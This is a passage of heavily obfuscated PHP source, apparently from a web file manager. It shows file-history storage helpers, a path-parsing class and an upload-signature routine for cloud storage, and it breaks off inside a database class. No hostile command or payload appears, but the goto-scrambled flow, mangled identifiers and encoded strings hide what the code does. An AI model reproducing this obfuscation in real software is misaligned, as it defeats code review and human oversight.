setDetail($d°¢åÖûÊÍ, $B—≠òëÙ∏Ì, $a˜†üã€òÇ) { $CﬁÖÚ”–¡ =& $_SERVER[™⁄»üÆ]; $d„¨çºúŒ≠ = self::listData($d°¢åÖûÊÍ); if (!$d„¨çºúŒ≠) { return; } foreach ($d„¨çºúŒ≠[$CﬁÖÚ”–¡[367]] as $cª≥ïÑÀ È => $C§àÁèı¶é) { if ($C§àÁèı¶é[$CﬁÖÚ”–¡[394]] == $B—≠òëÙ∏Ì) { $d„¨çºúŒ≠[$CﬁÖÚ”–¡[367]][$cª≥ïÑÀ È][$CﬁÖÚ”–¡[1137]] = $a˜†üã€òÇ; self::saveData($d„¨çºúŒ≠[$CﬁÖÚ”–¡[1139]], $d„¨çºúŒ≠[$CﬁÖÚ”–¡[367]]); return !0; } } return !1; } public static function fileInfo($bÔ˜ñ™ı‚‚, $dä≥™»ëçˆ) { goto dÇ≥πõêÔÎ; EßßºÊ®˘ﬁ: return IO::info($D≠∂›•¶áº); goto eˆÜà´∫«ç; aåÛıÙ¡ü±: $D≠∂›•¶áº = $A≠ûπ≥•’ü[33]; foreach ($A±·£»πﬂª[$A≠ûπ≥•’ü[367]] as $F≈ÍÑ‘¢È” => $d§ÑÑ»üñ÷) { if ($d§ÑÑ»üñ÷[$A≠ûπ≥•’ü[394]] != $dä≥™»ëçˆ) { continue; } $D≠∂›•¶áº = $A±·£»πﬂª[$A≠ûπ≥•’ü[1138]] . $d§ÑÑ»üñ÷[$A≠ûπ≥•’ü[28]]; break; } if (!$D≠∂›•¶áº) { show_json(LNG($A≠ûπ≥•’ü[105]), !1); } goto EßßºÊ®˘ﬁ; dÇ≥πõêÔÎ: $A≠ûπ≥•’ü =& $_SERVER[™⁄»üÆ]; $A±·£»πﬂª = self::listData($bÔ˜ñ™ı‚‚); if (!$A±·£»πﬂª) { show_json(LNG($A≠ûπ≥•’ü[105]), !1); } goto aåÛıÙ¡ü±; eˆÜà´∫«ç: } public static function fileOut($f’‚’Ïë¨ê, $eá≥©“ÉÑÊ, $Fµîë∏£«¨ = false) { $FŸØï∫Öº’ =& $_SERVER[™⁄»üÆ]; $Cö∫®—ë±ä = self::fileInfo($f’‚’Ïë¨ê, $eá≥©“ÉÑÊ); $dâ¯Ãƒ˘í˜ =& $GLOBALS[$FŸØï∫Öº’[7]]; $Fµîë∏£«¨ = isset($dâ¯Ãƒ˘í˜[$FŸØï∫Öº’[1102]]) && $dâ¯Ãƒ˘í˜[$FŸØï∫Öº’[1102]] == 1; if (isset($dâ¯Ãƒ˘í˜[$FŸØï∫Öº’[29]]) && $dâ¯Ãƒ˘í˜[$FŸØï∫Öº’[29]] == $FŸØï∫Öº’[1140]) { return IO::fileOutImage($Cö∫®—ë±ä[$FŸØï∫Öº’[76]], $dâ¯Ãƒ˘í˜[$FŸØï∫Öº’[1141]]); } IO::fileOut($Cö∫®—ë±ä[$FŸØï∫Öº’[76]], $Fµîë∏£«¨, get_path_this($f’‚’Ïë¨ê)); } public static function listData($aî–⁄ª¢è», $AŸ«ı ¡õÛ = true) { goto Eíì—«åÙ‰; Eíì—«åÙ‰: $d…Ùı≈ªëÎ =& $_SERVER[™⁄»üÆ]; if ($AŸ«ı ¡õÛ && !IO::exist($aî–⁄ª¢è»)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto eûÓ≠¥ùûè; E®∫ÂŸâó∫: $dÃßçÎÙ£™ = IO::getContent($D”·≈æåê⁄[$d…Ùı≈ªëÎ[1139]]); if ($dÃßçÎÙ£™) { $dúö≥ıˆÇÂ = json_decode($dÃßçÎÙ£™, !0); if (is_array($dúö≥ıˆÇÂ)) { $D”·≈æåê⁄[$d…Ùı≈ªëÎ[367]] = $dúö≥ıˆÇÂ; } } return $D”·≈æåê⁄; goto E∫∏∞ëÉë”; eûÓ≠¥ùûè: if (substr($aî–⁄ª¢è», 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $DﬂÜ¨ÎóÕË = self::pathHistory($aî–⁄ª¢è»); $D”·≈æåê⁄ = array($d…Ùı≈ªëÎ[1139] => $DﬂÜ¨ÎóÕË . $d…Ùı≈ªëÎ[1126], $d…Ùı≈ªëÎ[1138] => rtrim(get_path_father($DﬂÜ¨ÎóÕË), $d…Ùı≈ªëÎ[8]) . $d…Ùı≈ªëÎ[8], $d…Ùı≈ªëÎ[367] => array()); goto E®∫ÂŸâó∫; E∫∏∞ëÉë”: } private static function saveData($bπ Üÿıá€, $E€´ºŸëäã) { goto b∑¡ÿÑÖŸΩ; cù¯øÈõÖ›: $d·µ˜≈êËç = IO::pathFather($bπ Üÿıá€); IO::remove($bπ Üÿıá€); self::clearEmptyFolder($d·µ˜≈êËç); goto Cêﬂüñ‹®Õ; Cêﬂüñ‹®Õ: return !0; goto Eá∆ÕŸ◊±õ; b∑¡ÿÑÖŸΩ: $E≥•ßñÜó˘ =& $_SERVER[™⁄»üÆ]; self::log($E≥•ßñÜó˘[1142] . $bπ Üÿıá€ . $E≥•ßñÜó˘[68] . count($E€´ºŸëäã), $E≥•ßñÜó˘[731]); if ($E€´ºŸëäã) { return IO::setContent($bπ Üÿıá€, json_encode($E€´ºŸëäã)); } goto cù¯øÈõÖ›; Eá∆ÕŸ◊±õ: } public static function clearEmptyFolder($aÇÈÇÿÆ∞ﬂ) { goto a ÁÎèõ†‰; Fºôºè≈»ó: self::clearEmptyFolder($C¡Ç¶ëÂÖ ); goto f∏≠ïª´–¨; a ÁÎèõ†‰: $CƒÛìÙ‡ù⁄ =& $_SERVER[™⁄»üÆ]; if (trim($aÇÈÇÿÆ∞ﬂ, $CƒÛìÙ‡ù⁄[8]) == trim(self::$_historyBase, $CƒÛìÙ‡ù⁄[8])) { return; } $C¡Ç¶ëÂÖ  = IO::pathFather($aÇÈÇÿÆ∞ﬂ); goto A¿ÿåÀÉÌ”; A¿ÿåÀÉÌ”: $E¥âÕØ¨Õè = IO::has($aÇÈÇÿÆ∞ﬂ, !0); if ($E¥âÕØ¨Õè[$CƒÛìÙ‡ù⁄[203]] > 0 || $E¥âÕØ¨Õè[$CƒÛìÙ‡ù⁄[204]] > 0) { return; } IO::remove($aÇÈÇÿÆ∞ﬂ); goto Fºôºè≈»ó; f∏≠ïª´–¨: } private static function getBasePath() { goto c©”ÿΩÍ† ; c©”ÿΩÍ† : $DŒÁ√áÉ¨¢ =& $_SERVER[™⁄»üÆ]; $c†∂—èÚ‡§ = Model($DŒÁ√áÉ¨¢[1143])->get($DŒÁ√áÉ¨¢[1144]); if ($c†∂—èÚ‡§) { if (!IO::exist($c†∂—èÚ‡§)) { IO::mkdir($c†∂—èÚ‡§); } if (get_path_this($c†∂—èÚ‡§) == $DŒÁ√áÉ¨¢[1129]) { $DÖ™˘üÀ‹£ = $DŒÁ√áÉ¨¢[1145] . rand_string(8); @rename($c†∂—èÚ‡§, get_path_father($c†∂—èÚ‡§) . $DŒÁ√áÉ¨¢[8] . $DÖ™˘üÀ‹£); $c†∂—èÚ‡§ = DATA_PATH . $DÖ™˘üÀ‹£ . $DŒÁ√áÉ¨¢[8]; file_put_contents(DATA_PATH . $DŒÁ√áÉ¨¢[1146], $DŒÁ√áÉ¨¢[33]); Model($DŒÁ√áÉ¨¢[1143])->set($DŒÁ√áÉ¨¢[1144], $c†∂—èÚ‡§); } return $c†∂—èÚ‡§; } goto A…ßÒåüÉ; A…ßÒåüÉ: $c†∂—èÚ‡§ = DATA_PATH . $DŒÁ√áÉ¨¢[1145] . rand_string(8) . $DŒÁ√áÉ¨¢[8]; $c†∂—èÚ‡§ = IO::mkdir($c†∂—èÚ‡§); $c†∂—èÚ‡§ = rtrim($c†∂—èÚ‡§, $DŒÁ√áÉ¨¢[8]) . $DŒÁ√áÉ¨¢[8]; goto e§Íç˜©»Á; e·∂ÎËÂ€â: return $c†∂—èÚ‡§; goto dÀÃ‘ÿ∑ªÇ; e§Íç˜©»Á: file_put_contents($c†∂—èÚ‡§ . $DŒÁ√áÉ¨¢[1146], $DŒÁ√áÉ¨¢[33]); file_put_contents(DATA_PATH . $DŒÁ√áÉ¨¢[1146], $DŒÁ√áÉ¨¢[33]); Model($DŒÁ√áÉ¨¢[1143])->set($DŒÁ√áÉ¨¢[1144], $c†∂—èÚ‡§); goto e·∂ÎËÂ€â; dÀÃ‘ÿ∑ªÇ: } } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\x65\162\x52\145\x63\171\x63\x6c\145\175"; const KOD_USER_FAV = "\173\165\163\145\162\x46\x61\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\x65\162\x46\151\154\145\x54\141\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\106\151\x6c\x65\124\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\x72\x6f\165\x70\x52\157\x6f\x74\x53\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\x68\141\162\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\x72\123\x68\x61\x72\145\x4c\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\x68\141\162\145\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\163\150\x61\x72\x65\111\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\150\141\162\145\111\x74\x65\155\114\x69\x6e\153\x7d"; const KOD_SEARCH = "\173\163\x65\x61\162\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\x6f\x63\x6b\x7d"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\173\165\163\x65\x72\x52\x65\156\x63\145\156\x74\175"; const KOD_USER_DRIVER = "\173\144\162\x69\166\x65\x72\175"; public static function typeList() { $fô√ßˆ∏èè =& $_SERVER[™⁄»üÆ]; return array($fô√ßˆ∏èè[1147] => self::KOD_SOURCE, $fô√ßˆ∏èè[1148] => self::KOD_USER_RECYCLE, $fô√ßˆ∏èè[1149] => self::KOD_USER_FAV, $fô√ßˆ∏èè[1150] => self::KOD_USER_FILE_TAG, $fô√ßˆ∏èè[1151] => self::KOD_USER_FILE_TYPE, $fô√ßˆ∏èè[1152] => self::KOD_GROUP_ROOT_SELF, $fô√ßˆ∏èè[1153] => self::KOD_USER_SHARE, $fô√ßˆ∏èè[1154] => self::KOD_USER_SHARE_LINK, $fô√ßˆ∏èè[1155] => self::KOD_USER_SHARE_TO_ME, $fô√ßˆ∏èè[1156] => self::KOD_SHARE_ITEM, $fô√ßˆ∏èè[1157] => self::KOD_SHARE_LINK, $fô√ßˆ∏èè[1158] => self::KOD_SEARCH, $fô√ßˆ∏èè[1159] => self::KOD_BLOCK, $fô√ßˆ∏èè[1160] => self::KOD_IO, $fô√ßˆ∏èè[1161] => self::KOD_USER_RECENT, $fô√ßˆ∏èè[1162] => self::KOD_USER_DRIVER); } public static function parse($dæ–Ü÷›Í) { goto Eµ≤§Æ»éò; d öÖ¢–èõ: preg_match($aÿ»∆™øﬂñ[1163], $dæ–Ü÷›Í, $eÀ¡©ªà∂ˆ); $bŒä®ÿ’ùº = array($aÿ»∆™øﬂñ[416] => !1, $aÿ»∆™øﬂñ[1164] => !1, $aÿ»∆™øﬂñ[413] => !1, $aÿ»∆™øﬂñ[76] => $dæ–Ü÷›Í, $aÿ»∆™øﬂñ[1073] => !1, $aÿ»∆™øﬂñ[1072] => $aÿ»∆™øﬂñ[33]); if (is_array($eÀ¡©ªà∂ˆ) && count($eÀ¡©ªà∂ˆ) == 5) { $fïÜ¯π∑áƒ = $aÿ»∆™øﬂñ[1165] . $eÀ¡©ªà∂ˆ[2] . $aÿ»∆™øﬂñ[325]; if (in_array($fïÜ¯π∑áƒ, $f»∆›‹´Œ)) { $bŒä®ÿ’ùº[$aÿ»∆™øﬂñ[1073]] = $eÀ¡©ªà∂ˆ[1]; $bŒä®ÿ’ùº[$aÿ»∆™øﬂñ[29]] = $fïÜ¯π∑áƒ; $bŒä®ÿ’ùº[$aÿ»∆™øﬂñ[1166]] = substr($fïÜ¯π∑áƒ, 1, -1); $bŒä®ÿ’ùº[$aÿ»∆™øﬂñ[394]] = $eÀ¡©ªà∂ˆ[3]; } $bŒä®ÿ’ùº[$aÿ»∆™øﬂñ[1072]] = $eÀ¡©ªà∂ˆ[4]; } goto a’ª·ò¥¿†; a’ª·ò¥¿†: $DÖ¨Ü≤ÇÖÚ = array($aÿ»∆™øﬂñ[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $bŒä®ÿ’ùº[$aÿ»∆™øﬂñ[1128]] = in_array($bŒä®ÿ’ùº[$aÿ»∆™øﬂñ[29]], $DÖ¨Ü≤ÇÖÚ); return $bŒä®ÿ’ùº; goto aìãÜ∆…◊Í; Eµ≤§Æ»éò: $aÿ»∆™øﬂñ =& $_SERVER[™⁄»üÆ]; $dæ–Ü÷›Í = self::clear($dæ–Ü÷›Í); $f»∆›‹´Œ = array_values(self::typeList()); goto d öÖ¢–èõ; aìãÜ∆…◊Í: } public static function isTruePath($A®å¶áã•’) { goto e¶åçªﬁèÇ; f©√§“å´†: if (strpos($A®å¶áã•’, $cÑÕñœÉôå[1132]) === 0) { return !0; } if (strpos($A®å¶áã•’, $cÑÕñœÉôå[1167]) === 0) { return !0; } if (strpos($A®å¶áã•’, $cÑÕñœÉôå[1168]) === 0) { return !0; } goto B†ŸßÛÉﬂò; B†ŸßÛÉﬂò: if (strpos($A®å¶áã•’, $cÑÕñœÉôå[1169]) === 0) { return !0; } return !1; goto Dÿ°óÜ‰ŸÙ; e¶åçªﬁèÇ: $cÑÕñœÉôå =& $_SERVER[™⁄»üÆ]; if (substr($A®å¶áã•’, 0, 1) != $cÑÕñœÉôå[1165]) { return !0; } if (strpos($A®å¶áã•’, $cÑÕñœÉôå[402]) === 0) { return !0; } goto f©√§“å´†; Dÿ°óÜ‰ŸÙ: } public static function clear($eäúåù‡≤›) { goto D⁄Ï«É‘ÿ÷; FûàΩ∑ª‘ª: $Eô‰ŒéÆ±è = $D·Ó∆‚¬•ˆ[1170]; if (substr($eäúåù‡≤›, 0, 3) == $D·Ó∆‚¬•ˆ[1171]) { $eäúåù‡≤› = substr($eäúåù‡≤›, 3); } while (strstr($eäúåù‡≤›, $Eô‰ŒéÆ±è)) { $eäúåù‡≤› = str_replace($Eô‰ŒéÆ±è, $D·Ó∆‚¬•ˆ[8], $eäúåù‡≤›); } goto f⁄ÓŒ‚Â€; D⁄Ï«É‘ÿ÷: $D·Ó∆‚¬•ˆ =& $_SERVER[™⁄»üÆ]; $eäúåù‡≤› = str_replace(array($D·Ó∆‚¬•ˆ[1046], $D·Ó∆‚¬•ˆ[229]), $D·Ó∆‚¬•ˆ[50], $eäúåù‡≤›); $eäúåù‡≤› = str_replace($D·Ó∆‚¬•ˆ[97], $D·Ó∆‚¬•ˆ[8], $eäúåù‡≤›); goto FûàΩ∑ª‘ª; cıÉîáïÒ∞: return $eäúåù‡≤›; goto F¶éçÙ¨ŸÙ; f⁄ÓŒ‚Â€: $eäúåù‡≤› = preg_replace($D·Ó∆‚¬•ˆ[1172], $D·Ó∆‚¬•ˆ[8], $eäúåù‡≤›); if ($eäúåù‡≤› == $D·Ó∆‚¬•ˆ[8]) { return $D·Ó∆‚¬•ˆ[8]; } $eäúåù‡≤› = rtrim($eäúåù‡≤›, $D·Ó∆‚¬•ˆ[8]); goto cıÉîáïÒ∞; F¶éçÙ¨ŸÙ: } public static function sourceID($c–ÜØ≈¢πÕ) { $A‹ïæŸåË¿ =& $_SERVER[™⁄»üÆ]; $bòÂÜËı·≥ = self::parse($c–ÜØ≈¢πÕ); if ($bòÂÜËı·≥[$A‹ïæŸåË¿[29]] !== self::KOD_SOURCE) { show_json(LNG($A‹ïæŸåË¿[1173]), !1); } return $bòÂÜËı·≥[$A‹ïæŸåË¿[394]]; } public static function make($c‚›«æ…«ÿ) { if (!$c‚›«æ…«ÿ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($c‚›«æ…«ÿ)); } public static function makeShare($C€æø¢Ã„ë, $cêé˜ÛùÔ‡) { return self::makePath(self::KOD_SHARE_ITEM, $C€æø¢Ã„ë, $cêé˜ÛùÔ‡); } public static function makeFileTypePath($B∞îì«ÑŒæ) { return self::makePath(self::KOD_USER_FILE_TYPE, $B∞îì«ÑŒæ); } public static function makeFileTagPath($bü…¥Ù®Ö´) { return self::makePath(self::KOD_USER_FILE_TAG, $bü…¥Ù®Ö´); } public static function makePath($b«ÆÁ˘Ú»º, $aÙîäΩÕ∏ = '', $f∑î ≈Â≥¯ = '') { $dùÂã¶ë‰û =& $_SERVER[™⁄»üÆ]; $dÉéŸ„Ú¶¿ = substr($b«ÆÁ˘Ú»º, 1, -1); $Bè”∑ÿåÉ = $dùÂã¶ë‰û[1174] . $dÉéŸ„Ú¶¿ . $dùÂã¶ë‰û[1175] . $aÙîäΩÕ∏ . $dùÂã¶ë‰û[1176]; $Bè”∑ÿåÉ = $f∑î ≈Â≥¯ ? $Bè”∑ÿåÉ . $f∑î ≈Â≥¯ . $dùÂã¶ë‰û[8] : $Bè”∑ÿåÉ; return $Bè”∑ÿåÉ; } public static function hashPath($A›æºäı ã, $CéûÒ≤•⁄â = true) { goto eÉ≥Ã‹ïÕÓ; eıÍÑã«¨ﬁ: return $cãÔñ«±±Ô; goto Dë◊ü≠ÓïÕ; aÆ‘»öëõé: if (!$cãÔñ«±±Ô && isset($CÚ·¡•Ñ§É[$dÓÍ¡Ö¿¶Í[396]])) { $CÚ·¡•Ñ§É = IO::info(KodIO::make($CÚ·¡•Ñ§É[$dÓÍ¡Ö¿¶Í[396]])); $cãÔñ«±±Ô = _get($CÚ·¡•Ñ§É, $dÓÍ¡Ö¿¶Í[1177], $dÓÍ¡Ö¿¶Í[33]); } if (!$cãÔñ«±±Ô && $CéûÒ≤•⁄â) { $C∞¥Ñ©Èø£ = KodIO::parse($CÚ·¡•Ñ§É[$dÓÍ¡Ö¿¶Í[76]]); if (!$C∞¥Ñ©Èø£[$dÓÍ¡Ö¿¶Í[29]]) { $cãÔñ«±±Ô = IO::hashSimple($CÚ·¡•Ñ§É[$dÓÍ¡Ö¿¶Í[76]]); } } if (!$cãÔñ«±±Ô) { $cãÔñ«±±Ô = md5($CÚ·¡•Ñ§É[$dÓÍ¡Ö¿¶Í[76]] . $CÚ·¡•Ñ§É[$dÓÍ¡Ö¿¶Í[78]] . $CÚ·¡•Ñ§É[$dÓÍ¡Ö¿¶Í[84]]); } goto eıÍÑã«¨ﬁ; eÉ≥Ã‹ïÕÓ: $dÓÍ¡Ö¿¶Í =& $_SERVER[™⁄»üÆ]; $CÚ·¡•Ñ§É = is_array($A›æºäı ã) ? $A›æºäı ã : IO::info($A›æºäı ã); $cãÔñ«±±Ô = _get($CÚ·¡•Ñ§É, $dÓÍ¡Ö¿¶Í[1177], $dÓÍ¡Ö¿¶Í[33]); goto aÆ‘»öëõé; Dë◊ü≠ÓïÕ: } public static function initSystemPath() { goto FªÚûªìõ„; F˜º»˜œÛö: define($C…Œ√ÍºÑŸ[1180], self::systemPath($C…Œ√ÍºÑŸ[1181])); define($C…Œ√ÍºÑŸ[1182], self::systemPath($C…Œ√ÍºÑŸ[1183])); define($C…Œ√ÍºÑŸ[1184], self::systemPath($C…Œ√ÍºÑŸ[1185])); goto fìäøå™òÜ; FªÚûªìõ„: $C…Œ√ÍºÑŸ =& $_SERVER[™⁄»üÆ]; if (defined($C…Œ√ÍºÑŸ[1178])) { return; } define($C…Œ√ÍºÑŸ[1178], self::systemPath($C…Œ√ÍºÑŸ[1179])); goto F˜º»˜œÛö; fìäøå™òÜ: IOHistory::bindEvent(); goto Bùº‚§˜ú™; Bùº‚§˜ú™: } public static function systemPath($BƒÉå∫¿Ö˘) { goto B∑∫‹°π—È; B∑∫‹°π—È: $bÜÉ‹ÏòÙ≠ =& $_SERVER[™⁄»üÆ]; $bóÃäô—∆≥ = $bÜÉ‹ÏòÙ≠[1186] . ucfirst($BƒÉå∫¿Ö˘); $CΩ†ïê∑πÆ = Model($bÜÉ‹ÏòÙ≠[749])->get($bóÃäô—∆≥); goto CçÜÎÊ‹¿∆; CçÜÎÊ‹¿∆: if ($CΩ†ïê∑πÆ) { return $CΩ†ïê∑πÆ; } if ($BƒÉå∫¿Ö˘ == $bÜÉ‹ÏòÙ≠[1179]) { $CΩ†ïê∑πÆ = self::make(Model($bÜÉ‹ÏòÙ≠[809])->systemRootPathAdd($bÜÉ‹ÏòÙ≠[519])); } else { $CΩ†ïê∑πÆ = self::systemPath($bÜÉ‹ÏòÙ≠[1179]); $Dﬂá†ã∂„¿ = self::sourceID($CΩ†ïê∑πÆ); $CΩ†ïê∑πÆ = self::make(Model($bÜÉ‹ÏòÙ≠[809])->mkdir($Dﬂá†ã∂„¿, $BƒÉå∫¿Ö˘)); } Model($bÜÉ‹ÏòÙ≠[749])->set($bóÃäô—∆≥, $CΩ†ïê∑πÆ); goto b®¬ßÏßêÇ; b®¬ßÏßêÇ: return $CΩ†ïê∑πÆ; goto eÂÓŸˆÖ˘ì; eÂÓŸˆÖ˘ì: } public static function systemFolder($D»í⁄∑∆Ñô) { $eû¯æì≠âà = IO_PATH_SYSTEM_SOURCE . $D»í⁄∑∆Ñô; $CÁí¿∑„ñ√ = Cache::get($eû¯æì≠âà); if (!$CÁí¿∑„ñ√) { $E∏¶ë≤À¬í = IO::infoFull($eû¯æì≠âà); if (!$E∏¶ë≤À¬í) { $CÁí¿∑„ñ√ = IO::mkdir($eû¯æì≠âà, REPEAT_SKIP); } else { $CÁí¿∑„ñ√ = $E∏¶ë≤À¬í[$_SERVER[™⁄»üÆ][76]]; } Cache::set($eû¯æì≠âà, $CÁí¿∑„ñ√, 3600 * 10); } return $CÁí¿∑„ñ√; } public static function defaultDriver() { return Model($_SERVER[™⁄»üÆ][746])->defaultDriver(); } public static function defaultIO() { $F÷–‡´ËÜâ =& $_SERVER[™⁄»üÆ]; $C˘·ëÊ˘ΩÁ = self::defaultDriver(); return $F÷–‡´ËÜâ[1187] . $C˘·ëÊ˘ΩÁ[$F÷–‡´ËÜâ[394]] . $F÷–‡´ËÜâ[1176]; } public static function defaultDriverInit() { static $bãúá‚≈Ï° = false; if ($bãúá‚≈Ï°) { return $bãúá‚≈Ï°; } $bãúá‚≈Ï° = IO::init(self::defaultIO()); return $bãúá‚≈Ï°; } public static function fileTypeList() { $bõ≈î÷ûµÃ =& $_SERVER[™⁄»üÆ]; $DÂ“πÓ≠îÑ = $GLOBALS[$bõ≈î÷ûµÃ[6]][$bõ≈î÷ûµÃ[1188]]; foreach ($DÂ“πÓ≠îÑ as $Bê´—§º∆¨ => $dé≥ûèçáÓ) { $cÌ‰˘ê«ùË = $bõ≈î÷ûµÃ[1189] . $Bê´—§º∆¨; $E•˘ã€°ÆÀ = LNG($cÌ‰˘ê«ùË); if ($cÌ‰˘ê«ùË != $E•˘ã€°ÆÀ) { $DÂ“πÓ≠îÑ[$Bê´—§º∆¨][$bõ≈î÷ûµÃ[28]] = $E•˘ã€°ÆÀ; } } return $DÂ“πÓ≠îÑ; } public static function transferType($cˆÓˆÑ«ˆõ, $BΩ∞≠êÆ—È) { goto A√ÿ É€ÀÇ; A∞£ﬁˆÉÜÂ: return $EËÑıÛ∑Ú[1192]; goto EËõñ¥öÇÙ; A√ÿ É€ÀÇ: $EËÑıÛ∑Ú =& $_SERVER[™⁄»üÆ]; $D´±Úƒµ≈À = self::driverType($cˆÓˆÑ«ˆõ); $DìÎº“•¯∏ = self::driverType($BΩ∞≠êÆ—È); goto bÆ´€àê∞ﬁ; bÆ´€àê∞ﬁ: if ($D´±Úƒµ≈À[$EËÑıÛ∑Ú[29]] == $DìÎº“•¯∏[$EËÑıÛ∑Ú[29]] && $D´±Úƒµ≈À[$EËÑıÛ∑Ú[1190]] == $DìÎº“•¯∏[$EËÑıÛ∑Ú[1190]]) { return $EËÑıÛ∑Ú[1191]; } if ($D´±Úƒµ≈À[$EËÑıÛ∑Ú[29]] == $EËÑıÛ∑Ú[843] && $DìÎº“•¯∏[$EËÑıÛ∑Ú[29]] == $EËÑıÛ∑Ú[106]) { return $EËÑıÛ∑Ú[1102]; } if ($D´±Úƒµ≈À[$EËÑıÛ∑Ú[29]] == $EËÑıÛ∑Ú[106] && $DìÎº“•¯∏[$EËÑıÛ∑Ú[29]] == $EËÑıÛ∑Ú[843]) { return $EËÑıÛ∑Ú[107]; } goto A∞£ﬁˆÉÜÂ; EËõñ¥öÇÙ: } public static function driverType($aÙ‘⁄ßàÖÛ) { goto C·∂ëã∏∑≈; D≤Âı—Û…á: return array($e –·ãÌñ´[29] => $e –·ãÌñ´[843], $e –·ãÌñ´[1190] => $aÙ‘⁄ßàÖÛ->pathDriver, $e –·ãÌñ´[76] => $Dôòøä¢¿µ); goto eÇ∫åä◊…ô; EÛÈÉçûä‚: if ($eº≠ıîÉ◊û == $e –·ãÌñ´[737] || $eº≠ıîÉ◊û == $e –·ãÌñ´[1194] || $eº≠ıîÉ◊û == $e –·ãÌñ´[1195]) { $aÙ‘⁄ßàÖÛ = self::defaultDriverInit(); } else { if ($eº≠ıîÉ◊û == $e –·ãÌñ´[1109] || $eº≠ıîÉ◊û == $e –·ãÌñ´[1196]) { $aÙ‘⁄ßàÖÛ = IO::init($aÙ‘⁄ßàÖÛ->pathParse[$e –·ãÌñ´[1056]]); } } $eº≠ıîÉ◊û = str_replace($e –·ãÌñ´[1193], $e –·ãÌñ´[33], strtolower($aÙ‘⁄ßàÖÛ->getType())); if ($eº≠ıîÉ◊û == $e –·ãÌñ´[106]) { return array($e –·ãÌñ´[29] => $e –·ãÌñ´[106], $e –·ãÌñ´[1190] => $e –·ãÌñ´[33], $e –·ãÌñ´[76] => $Dôòøä¢¿µ); } goto D≤Âı—Û…á; C·∂ëã∏∑≈: $e –·ãÌñ´ =& $_SERVER[™⁄»üÆ]; $Dôòøä¢¿µ = $aÙ‘⁄ßàÖÛ->path; $eº≠ıîÉ◊û = str_replace($e –·ãÌñ´[1193], $e –·ãÌñ´[33], strtolower($aÙ‘⁄ßàÖÛ->getType())); goto EÛÈÉçûä‚; eÇ∫åä◊…ô: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($dÉ∆™Ü∆Üë) { parent::__construct($dÉ∆™Ü∆Üë); $this->signatureVersion($_SERVER[™⁄»üÆ][212]); } public function uploadFormData($BîãÿÜâê», $bº¶∫¥ÍÿË = 3600) { goto DÁºç‹ÒùÇ; bíõÜ·¶‹™: $a¨íûˆ≥—’ = sha1($DÎ¥¨ÇíÕÑ); $bò∏§∂†íæ = hash_hmac($f¢™…ÑŒó¢[230], $a¨íûˆ≥—’, $eØá◊≠Í›‚); $D≤ÆÚÂÖº« = array($f¢™…ÑŒó¢[1201] => $F°¿≥˜ì†π, $f¢™…ÑŒó¢[1205] => $CçÜÓÙó»‘, $f¢™…ÑŒó¢[1209] => base64_encode($DÎ¥¨ÇíÕÑ), $f¢™…ÑŒó¢[1206] => $Bâôíôö»ú, $f¢™…ÑŒó¢[1207] => $this->accessKey, $f¢™…ÑŒó¢[1210] => $F∆êµ∫æπí, $f¢™…ÑŒó¢[1211] => $bò∏§∂†íæ, $f¢™…ÑŒó¢[175] => $this->getHost()); goto A«öÁ¬®´ò; A«öÁ¬®´ò: return $D≤ÆÚÂÖº«; goto B§ﬁ–Óáä±; eÉÌ¶ÁöôÊ: $CçÜÓÙó»‘ = $f¢™…ÑŒó¢[1197]; $aÃŒ€À€¢∫ = gmdate($f¢™…ÑŒó¢[1198], time() + $bº¶∫¥ÍÿË); $F∆êµ∫æπí = (string) time() . $f¢™…ÑŒó¢[68] . (string) (time() + $bº¶∫¥ÍÿË); goto eÁÁ˘‡¶å; eÁÁ˘‡¶å: $DÎ¥¨ÇíÕÑ = array($f¢™…ÑŒó¢[1199] => $aÃŒ€À€¢∫, $f¢™…ÑŒó¢[1200] => array(array($f¢™…ÑŒó¢[1201] => $F°¿≥˜ì†π), array($f¢™…ÑŒó¢[1202] => $this->bucket), array($f¢™…ÑŒó¢[1203], $f¢™…ÑŒó¢[1204], $f¢™…ÑŒó¢[33]), array($f¢™…ÑŒó¢[1205] => $CçÜÓÙó»‘), array($f¢™…ÑŒó¢[1206] => $Bâôíôö»ú), array($f¢™…ÑŒó¢[1207] => $this->accessKey), array($f¢™…ÑŒó¢[1208] => $F∆êµ∫æπí))); $DÎ¥¨ÇíÕÑ = json_encode($DÎ¥¨ÇíÕÑ); $eØá◊≠Í›‚ = hash_hmac($f¢™…ÑŒó¢[230], $F∆êµ∫æπí, $this->secret); goto bíõÜ·¶‹™; DÁºç‹ÒùÇ: $f¢™…ÑŒó¢ =& $_SERVER[™⁄»üÆ]; $F°¿≥˜ì†π = $f¢™…ÑŒó¢[192]; $Bâôíôö»ú = $f¢™…ÑŒó¢[230]; goto eÉÌ¶ÁöôÊ; B§ﬁ–Óáä±: } public function fileOutLink($B’®≠©öÈã) { $B∏™ƒÖ˘óÿ =& $_SERVER[™⁄»üÆ]; if (substr($B’®≠©öÈã, 0, 7) == $B∏™ƒÖ˘óÿ[1212]) { $B’®≠©öÈã = $B∏™ƒÖ˘óÿ[1213] . substr($B’®≠©öÈã, 7); } header($B∏™ƒÖ˘óÿ[159] . $B’®≠©öÈã); die; } } goto Dß”Ìã∫ﬂ›; E‰≤Ã¢√∏Ô: class DbMysql extends Db { public function __construct($dÛÍÎ´â–à = '') { $bƒùÜäﬂ‘¥ =& $_SERVER[™⁄»üÆ]; if (!extension_loaded($bƒùÜäﬂ‘¥[778])) { 